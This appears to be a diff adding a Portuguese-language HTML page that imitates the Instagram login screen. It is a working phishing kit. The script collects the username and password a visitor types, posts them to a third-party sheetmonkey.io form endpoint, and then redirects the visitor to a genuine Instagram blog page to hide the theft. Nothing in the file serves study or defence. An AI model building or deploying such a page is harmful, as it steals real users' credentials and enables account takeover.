@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" href="favicon.png" type="image/png">
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        header {
+            width: 100%;
+            background-color: transparent;
+            text-align: center;
+            padding: 1px 0;
+            position: relative;
+        }
+
+        header h1 {
+            margin: 0;
+            cursor: pointer;
+            font-size: 14px;
+            position: absolute;
+            top: 5px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .dropdown {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: white;
+            border: 1px solid #cdcdcd;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            width: 200px;
+        }
+
+        .dropdown ul {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+
+        .dropdown ul li {
+            padding: 10px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .dropdown ul li:hover {
+            background-color: #f1f1f1;
+        }
+
+        .dropdown ul li a {
+            text-decoration: none;
+            color: #333;
+            display: block;
+        }
+
+        .show {
+            display: block;
+        }
+
+        .rectangle {
+            width: 100%;
+            height: 250px;
+            background-color: transparent;
+            margin-top: 19px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .rectangle img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+
+        /* Estilo dos campos de entrada */
+        .input-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .input-field {
+            width: 80%;
+            padding: 10px;
+            margin: 4px 0;
+            background-color: #f0f0f0;
+            border: 1px solid #cdcdcd;
+            border-radius: 5px; /* Borda levemente arredondada */
+            box-sizing: border-box;
+        }
+
+        /* Estilo do texto "Esqueceu a senha?" */
+        .forgot-password {
+            width: 80%;
+            text-align: right;
+            margin-top: 5px;
+        }
+
+        .forgot-password a {
+            color: #4cb4fb; /* Azul fornecido */
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        /* Estilo do botão "Entrar" */
+        .btn-container {
+            width: 80%;
+            margin-top: 20px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #ADD8E6; /* Azul claro */
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: not-allowed;
+        }
+
+        .btn.active {
+            background-color: #4cb4fb; /* Azul mais forte */
+            cursor: pointer;
+        }
+
+        /* Estilo do texto "Cadastre-se" */
+        .signup-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .signup-text a {
+            color: #4cb4fb; /* Azul fornecido */
+            text-decoration: none;
+        }
+
+        .signup-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* Estilo do texto sobre os Termos de Uso e Política de Privacidade */
+        .terms-text {
+            width: 80%;
+            margin: 20px auto; /* Centraliza o texto */
+            font-size: 12px;
+            color: #333; /* Cinza escuro */
+            text-align: center;
+        }
+
+        .terms-text span {
+            color: #000; /* Preto forte */
+            font-weight: bold;
+        }
+
+        /* Estilo da imagem abaixo do texto */
+        .image-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .image-container img {
+            max-width: 50%; /* Reduz a largura da imagem */
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1 id="header-text">Português (Brasil)</h1>
+        <div id="country-dropdown" class="dropdown">
+            <ul>
+                <li><a href="#">Brasil</a></li>
+                <li><a href="#">Estados Unidos</a></li>
+                <li><a href="#">França</a></li>
+                <li><a href="#">Alemanha</a></li>
+                <li><a href="#">Japão</a></li>
+                <li><a href="#">Portugal</a></li>
+            </ul>
+        </div>
+    </header>
+
+    <!-- Retângulo abaixo do cabeçalho com imagem centralizada -->
+    <div class="rectangle">
+        <img src="p.png" alt="Logo">
+    </div>
+
+    <!-- Campos de entrada abaixo do retângulo -->
+    <div class="input-container">
+        <input type="text" class="input-field" id="username" placeholder="Telefone, nome de usuário ou e-mail">
+        <input type="password" class="input-field" id="password" placeholder="Senha">
+
+        <!-- Texto "Esqueceu a senha?" ao lado direito -->
+        <div class="forgot-password">
+            <a href="?.html">Esqueceu a senha?</a>
+        </div>
+
+        <!-- Botão "Entrar" -->
+        <div class="btn-container">
+            <button class="btn" id="login-btn">Entrar</button>
+        </div>
+
+        <!-- Texto "Não tem uma conta? Cadastre-se" abaixo do botão -->
+        <div class="signup-text">
+            Não tem uma conta? <a href="?.html">Cadastre-se</a>
+        </div>
+
+        <!-- Texto sobre os Termos de Uso e Política de Privacidade -->
+        <div class="terms-text">
+            Ao continuar, você concorda com os <span>Termos de Uso</span> e a <span>Política de Privacidade</span> do Instagram.
+        </div>
+
+        <!-- Imagem abaixo do texto -->
+        <div class="image-container">
+            <img src="2.png" alt="Imagem adicional">
+        </div>
+    </div>
+
+    <script>
+        const headerText = document.getElementById('header-text');
+        const dropdown = document.getElementById('country-dropdown');
+        const loginBtn = document.getElementById('login-btn');
+        const usernameField = document.getElementById('username');
+        const passwordField = document.getElementById('password');
+
+        headerText.addEventListener('click', () => {
+            dropdown.classList.toggle('show');
+        });
+
+        window.addEventListener('click', function(event) {
+            if (!event.target.matches('#header-text')) {
+                dropdown.classList.remove('show');
+            }
+        });
+
+        // Verifica os campos para habilitar o botão
+        function checkFields() {
+            if (usernameField.value !== "" && passwordField.value !== "") {
+                loginBtn.classList.add('active');
+                loginBtn.disabled = false;
+            } else {
+                loginBtn.classList.remove('active');
+                loginBtn.disabled = true;
+            }
+        }
+
+        usernameField.addEventListener('input', checkFields);
+        passwordField.addEventListener('input', checkFields);
+
+        // Manipulador de evento para o botão "Entrar"
+        loginBtn.addEventListener('click', function() {
+            if (loginBtn.classList.contains('active')) {
+                const username = usernameField.value;
+                const password = passwordField.value;
+
+                // Enviar os dados para a API
+                fetch('https://api.sheetmonkey.io/form/mg134rUki21xoEhnYJm9Yj', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Redirecionar após o sucesso
+                        window.location.href = 'https://about.instagram.com/pt-br/blog/announcements';
+                    } else {
+                        alert('Erro ao enviar os dados. Tente novamente.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erro:', error);
+                    alert('Erro ao enviar os dados. Tente novamente.');
+                });
+            }
+        });
+    </script>
+
+</body>
+</html>
